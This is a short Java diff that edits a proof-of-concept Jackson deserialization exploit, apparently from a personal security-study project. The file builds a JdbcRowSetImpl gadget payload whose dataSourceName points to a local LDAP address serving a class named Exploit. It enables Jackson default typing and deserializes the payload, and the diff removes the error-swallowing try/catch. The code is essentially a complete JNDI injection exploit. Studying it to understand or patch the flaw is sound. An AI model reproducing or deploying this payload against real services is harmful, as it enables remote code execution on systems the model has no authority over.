@@ -2,21 +2,18 @@ package com.test.jackson;
 
 import com.fasterxml.jackson.databind.ObjectMapper;
 
+import java.io.IOException;
+
 /**
  * @Author:Wadewfsssss
  */
 
 public class JdbcRowSetImpl {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws IOException {
         String payload = "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true}]";
-        System.out.println(payload);
         ObjectMapper mapper = new ObjectMapper();
         mapper.enableDefaultTyping();
-        try {
-            mapper.readValue(payload, Object.class);
-        } catch (Throwable e) {
-
-        }
+        mapper.readValue(payload, Object.class);
     }
 }
